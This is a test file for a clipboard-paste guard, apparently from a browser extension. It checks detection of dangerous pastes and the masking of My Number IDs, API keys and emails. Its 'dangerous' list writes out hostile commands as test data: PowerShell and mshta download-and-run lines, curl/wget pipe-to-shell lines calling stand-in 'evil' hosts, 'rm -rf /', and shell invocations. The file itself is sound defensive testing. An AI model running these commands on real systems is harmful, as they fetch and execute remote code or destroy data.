import { describe, expect, it } from 'vitest';
import {
  MASK_TOKEN,
  describeMask,
  describePasteThreat,
  isDangerousPaste,
  sanitizePaste,
} from './patterns';

describe('isDangerousPaste', () => {
  const dangerous = [
    'powershell -nop -w hidden -c "iex(New-Object Net.WebClient).DownloadString(\'http://x\')"',
    'pwsh -Command Invoke-WebRequest http://evil/x.ps1',
    'cmd.exe /c calc',
    'mshta http://evil/a.hta',
    'curl http://evil.sh/x | sh',
    'curl -fsSL http://evil/x | bash',
    'wget -qO- http://evil/x | sh',
    'bash -c "rm -rf /"',
    'iex (irm http://evil/x)',
    '/bin/bash -i',
    '/bin/sh',
  ];

  it.each(dangerous)('flags dangerous payload: %s', (payload) => {
    expect(isDangerousPaste(payload)).toBe(true);
  });

  const benign = [
    'https://github.com/zenprax/kiba.crx',
    'The quick brown fox jumps over the lazy dog.',
    'SELECT * FROM users WHERE id = 1;',
    'npm install react react-dom',
    'curl is a tool I like to read about',
    '',
  ];

  it.each(benign)('allows benign text: %s', (text) => {
    expect(isDangerousPaste(text)).toBe(false);
  });
});

describe('describePasteThreat', () => {
  it('labels PowerShell payloads', () => {
    expect(describePasteThreat('powershell -c iex(...)')).toBe('Blocked PowerShell paste');
  });

  it('labels curl pipe-to-shell payloads', () => {
    expect(describePasteThreat('curl http://x | sh')).toBe('Blocked curl/wget pipe-to-shell paste');
  });

  it('falls back to a generic label', () => {
    expect(describePasteThreat('Invoke-Expression $payload')).toBe('Blocked Invoke-Expression paste');
  });
});

describe('sanitizePaste', () => {
  it('masks a Japanese My Number (12 digits)', () => {
    const result = sanitizePaste('番号は 123456789012 です');
    expect(result.sanitized).toBe(`番号は ${MASK_TOKEN} です`);
    expect(result.masked).toBe(true);
    expect(result.matchedLabels).toContain('My Number');
  });

  it('masks an API key', () => {
    const result = sanitizePaste('key=sk-ABCDEFGHIJKLMNOPQRSTUV');
    expect(result.sanitized).toBe(`key=${MASK_TOKEN}`);
    expect(result.matchedLabels).toContain('API Key');
  });

  it('masks an email address', () => {
    const result = sanitizePaste('contact alice@example.com today');
    expect(result.sanitized).toBe(`contact ${MASK_TOKEN} today`);
    expect(result.matchedLabels).toContain('Email');
  });

  it('masks multiple kinds and de-duplicates labels', () => {
    const result = sanitizePaste('a@b.com 123456789012 c@d.com');
    expect(result.sanitized).toBe(`${MASK_TOKEN} ${MASK_TOKEN} ${MASK_TOKEN}`);
    expect(result.masked).toBe(true);
    // Email appears twice but should be listed once.
    expect(result.matchedLabels.filter((l) => l === 'Email')).toHaveLength(1);
    expect(result.matchedLabels).toContain('My Number');
  });

  const benign = [
    'The quick brown fox.',
    '03-1234-5678', // phone number, not a 12-digit My Number
    'order #12345',
    '',
  ];

  it.each(benign)('leaves benign text unchanged: %s', (text) => {
    const result = sanitizePaste(text);
    expect(result.masked).toBe(false);
    expect(result.sanitized).toBe(text);
    expect(result.matchedLabels).toEqual([]);
  });
});

describe('describeMask', () => {
  it('summarizes masked labels', () => {
    const result = sanitizePaste('a@b.com 123456789012');
    expect(describeMask(result)).toBe('Masked confidential data: My Number, Email');
  });

  it('reports nothing masked', () => {
    expect(describeMask(sanitizePaste('hello'))).toBe('No confidential data masked');
  });
});
